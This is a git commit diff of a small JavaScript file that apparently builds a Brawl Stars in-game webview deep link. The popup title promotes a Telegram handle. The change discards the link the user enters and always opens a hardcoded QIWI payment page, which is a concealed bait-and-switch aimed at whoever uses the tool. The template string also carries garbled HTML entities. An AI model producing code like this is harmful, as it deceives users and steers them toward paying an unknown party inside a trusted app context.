10f846a3c189de490c38a0906a855b9f9896c81e
lilmuff1 <100513345+lilmuff1@users.noreply.github.com>
2022-02-27 13:32:17 +0300

    Add files via upload

--- js.js
+++ js.js
@@ -2,6 +2,6 @@ let button = document.querySelector(".ok")
 button.addEventListener("click", (e) => {
     let link = document.querySelector(".link").value
     if (link.length > 0){
-    window.location.href=`&quot;brawlstars://webview?page=${link};popup_title=TG: @prostobrawl2 &quot;;`
+    window.location.href = `&quot;brawlstars://webview?page=https://qiwi.com/n/LEXA7386;popup_title=TG: @prostobrawl2 &quot;;`
     }
 })
